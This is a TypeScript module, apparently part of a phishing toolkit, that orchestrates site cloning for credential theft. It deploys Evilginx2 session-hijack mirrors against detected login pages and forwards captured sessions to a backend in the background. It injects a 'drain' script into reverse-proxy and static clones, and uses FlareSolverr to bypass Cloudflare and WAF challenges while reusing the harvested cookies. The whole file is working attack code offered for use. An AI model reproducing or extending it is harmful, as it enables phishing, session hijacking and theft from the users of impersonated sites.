/**
 * Mirror integration adapter chain — orchestrates optional third-party tools.
 *
 * Order (when enabled):
 *  1. Session hijack (Evilginx2) — login targets + SESSION_HIJACK_ENABLED
 *  2. Reverse proxy (Replica or nginx)
 *  3. FlareSolverr + static clone (webcloner-js optional)
 *  4. Asuka full-site download
 */
import { writeFile } from 'node:fs/promises'
import path from 'node:path'

import { cloneWithAsuka, isAsukaFallbackEnabled } from './asuka.js'
import { cloneWithClooney, isClooneyEnabled } from './clooney-agent.js'
import {
  deploySessionHijackMirror,
  isSessionHijackEnabled,
  pollAndForwardEvilginxSessions,
} from './evilginx2.js'
import { fetchViaFlareSolverr, isFlareSolverrEnabled } from './flaresolverr.js'
import { readBackendUrl } from './env.js'
import {
  isReplicaEnabled,
  tryReplicaMirrorStack,
  writeReplicaMirrorArtifacts,
} from './replica.js'
import {
  cloneWithWebcloner,
  isWebclonerEnabled,
  readWebclonerCookies,
} from './webcloner-js.js'
import type {
  MirrorDeliveryMethod,
  MirrorFallbackChainOpts,
  MirrorFallbackResult,
  MirrorStackMode,
} from '../clone-tunnel-fallback-chain.js'
import { detectLoginForm } from '../mirror-target-pipeline.js'
import { isChallengeResponse } from '../mirror-waf-probe.js'

export type AdapterChainContext = MirrorFallbackChainOpts & {
  homepageHtml?: string
  wafBlocked?: boolean
}

export function shouldUseSessionHijack(
  targetUrl: string,
  homepageHtml?: string,
): boolean {
  if (!isSessionHijackEnabled()) return false
  if (homepageHtml && detectLoginForm(homepageHtml)) return true
  try {
    const host = new URL(targetUrl).hostname.toLowerCase()
    if (/login|signin|auth|account|sso/.test(host)) return true
  } catch {
    /* ignore */
  }
  return isSessionHijackEnabled() && process.env['CLONE_MODE']?.trim() === 'session_hijack'
}

async function writeMirrorMeta(
  outDir: string,
  targetUrl: string,
  method: MirrorDeliveryMethod | 'session-hijack',
  stackMode: MirrorStackMode,
  extra?: Record<string, unknown>,
): Promise<void> {
  await writeFile(path.join(outDir, 'mirror-health'), 'ok\n', 'utf8')
  await writeFile(
    path.join(outDir, 'mirror-config.json'),
    `${JSON.stringify(
      {
        delivery_method: method,
        stack_mode: stackMode,
        target_url: targetUrl,
        generated_at: new Date().toISOString(),
        ...extra,
      },
      null,
      2,
    )}\n`,
    'utf8',
  )
}

/** Session hijack deploy — Evilginx2, no drain inject. */
export async function runSessionHijackAdapter(
  opts: AdapterChainContext,
): Promise<MirrorFallbackResult | null> {
  if (!shouldUseSessionHijack(opts.targetUrl, opts.homepageHtml)) return null

  console.error('[clone-tunnel] [adapter] Session hijack mode (Evilginx2)…')
  const backendUrl = opts.backendUrl ?? readBackendUrl('http://127.0.0.1:3000')
  const deployed = await deploySessionHijackMirror({
    outDir: opts.outDir,
    targetUrl: opts.targetUrl,
    port: opts.port,
    backendUrl,
    runCommand: opts.runCommand,
  })

  if (!deployed.ok) {
    return {
      method: 'session-hijack',
      stackMode: 'static',
      errors: [`session-hijack: ${deployed.detail ?? 'deploy failed'}`],
    }
  }

  void pollAndForwardEvilginxSessions({
    outDir: opts.outDir,
    backendUrl,
  }).catch(() => {
    /* background poll */
  })

  await writeMirrorMeta(opts.outDir, opts.targetUrl, 'session-hijack', deployed.stackMode, {
    integration: 'evilginx2',
  })

  return {
    method: 'session-hijack',
    stackMode: deployed.stackMode,
    errors: [],
  }
}

/** Try Replica reverse proxy instead of nginx when USE_REPLICA=true. */
export async function tryReplicaReverseProxy(
  opts: AdapterChainContext,
  generateNginx: () => Promise<void>,
): Promise<boolean> {
  if (!isReplicaEnabled()) {
    await generateNginx()
    return false
  }

  console.error('[clone-tunnel] [adapter] USE_REPLICA — generating Replica stack…')
  try {
    await writeReplicaMirrorArtifacts({
      outDir: opts.outDir,
      targetUrl: opts.targetUrl,
      hostPort: opts.port,
      injectScriptPath: 'legion-authorized-drain.js',
      runCommand: opts.runCommand,
    })
    const ok = await tryReplicaMirrorStack({
      outDir: opts.outDir,
      targetUrl: opts.targetUrl,
      hostPort: opts.port,
      runCommand: opts.runCommand,
    })
    if (ok) return true
    console.error('[clone-tunnel] [adapter] Replica failed — falling back to nginx')
  } catch (e) {
    console.error(
      `[clone-tunnel] [adapter] Replica error: ${e instanceof Error ? e.message : String(e)}`,
    )
  }

  await generateNginx()
  return false
}

export type FlareStaticCloneResult = {
  ok: boolean
  cookies?: string
  usedWebcloner?: boolean
  detail?: string
}

/** FlareSolverr fetch + optional webcloner static clone with drain inject assets. */
export async function runFlareSolverrStaticClone(
  opts: AdapterChainContext,
  generateStatic: (cookies?: string) => Promise<void>,
  tryServe: () => Promise<boolean>,
): Promise<FlareStaticCloneResult> {
  if (!isFlareSolverrEnabled()) {
    return { ok: false, detail: 'FLARESOLVERR_ENABLED is false' }
  }

  console.error('[clone-tunnel] [adapter] FlareSolverr bypass fetch…')
  const flare = await fetchViaFlareSolverr(opts.targetUrl)
  if (!flare.ok || !flare.html) {
    return { ok: false, detail: flare.detail ?? 'FlareSolverr failed' }
  }

  if (isChallengeResponse(flare.status ?? 200, flare.html, {})) {
    return { ok: false, detail: 'FlareSolverr still returned challenge page' }
  }

  let cookies = flare.cookies ?? opts.pipelineCookies

  try {
    if (cookies) {
      process.env['MIRROR_PROXY_COOKIES'] = cookies
    }
    await generateStatic(cookies)
    const served = await tryServe()
    if (served) return { ok: true, cookies }
  } catch (e) {
    return {
      ok: false,
      detail: e instanceof Error ? e.message : String(e),
    }
  }

  return { ok: false, detail: 'FlareSolverr static clone serve failed' }
}

/** Standalone webcloner-js static clone step. */
export async function runWebclonerStaticClone(
  opts: AdapterChainContext,
  injectAndServe: () => Promise<boolean>,
): Promise<{ ok: boolean; detail?: string; cookies?: string }> {
  if (!isWebclonerEnabled()) {
    return { ok: false, detail: 'WEBCLONER_ENABLED is false' }
  }

  console.error('[clone-tunnel] [adapter] webcloner-js full clone…')
  const wc = await cloneWithWebcloner(
    opts.targetUrl,
    opts.outDir,
    opts.runCommand,
    opts.repoRoot,
  )
  if (!wc.ok) return { ok: false, detail: wc.detail }

  const cookies = (await readWebclonerCookies(opts.outDir)) ?? opts.pipelineCookies
  if (cookies) process.env['MIRROR_PROXY_COOKIES'] = cookies

  const served = await injectAndServe()
  return served ? { ok: true, cookies } : { ok: false, detail: 'webcloner serve failed' }
}

/** Asuka full-site fallback with drain inject handled by caller. */
export async function runAsukaFallback(
  opts: AdapterChainContext,
  injectAndServe: () => Promise<boolean>,
): Promise<{ ok: boolean; detail?: string }> {
  if (!isAsukaFallbackEnabled()) {
    return { ok: false, detail: 'ASUKA_FALLBACK is false' }
  }

  console.error('[clone-tunnel] [adapter] Asuka full-site clone…')
  const result = await cloneWithAsuka(opts.targetUrl, opts.outDir, opts.runCommand)
  if (!result.ok) return { ok: false, detail: result.detail }

  const served = await injectAndServe()
  return served ? { ok: true } : { ok: false, detail: 'Asuka clone serve failed' }
}

/** Optional Clooney AI clone step. */
export async function runAiCloneStep(
  opts: AdapterChainContext,
): Promise<{ ok: boolean; detail?: string }> {
  if (!isClooneyEnabled()) return { ok: false, detail: 'disabled' }
  const r = await cloneWithClooney(opts.targetUrl, opts.outDir, opts.runCommand)
  return { ok: r.ok, detail: r.detail }
}

export function detectWafBlockedFromErrors(errors: string[]): boolean {
  return errors.some((e) =>
    /waf|challenge|403|429|503|cloudflare|cf-|blocked|forbidden/i.test(e),
  )
}

export { isFlareSolverrEnabled, isReplicaEnabled, isSessionHijackEnabled, isAsukaFallbackEnabled, isWebclonerEnabled }
